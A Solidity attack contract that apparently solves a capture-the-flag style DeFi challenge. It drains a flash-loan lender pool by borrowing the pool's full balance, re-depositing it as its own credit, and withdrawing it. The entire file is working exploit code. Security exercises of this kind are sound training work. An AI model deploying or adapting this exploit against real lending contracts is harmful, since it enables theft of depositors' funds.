// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public immutable pool;
    address owner;

    constructor(SideEntranceLenderPool _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    function attack() external {
        require(msg.sender == owner, ":)");
        pool.flashLoan(address(pool).balance);
    }

    function execute() external override payable {
        require(msg.sender == address(pool), ":)");
        pool.deposit{value: address(this).balance}();
    }

    function withdraw() external {
        require(msg.sender == owner, ":)");
        pool.withdraw();
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, ":(");
    }

    receive() payable external {
    }
}
